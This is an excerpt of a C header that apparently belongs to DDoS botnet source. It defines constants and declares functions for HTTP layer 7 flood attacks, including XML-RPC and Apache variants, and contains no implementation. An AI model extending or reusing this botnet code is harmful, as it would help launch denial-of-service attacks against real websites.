...
#define ATK_VEC_CFNULL      44 /* HTTP layer 7 flood */
#define ATK_VEC_XMLRPC      45 /* HTTP layer 7 flood */
#define ATK_VEC_BOT     46 /* HTTP layer 7 flood */
#define ATK_VEC_APACHE 47
...
void attack_app_XMLRPC(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_bot(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_APACHE(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
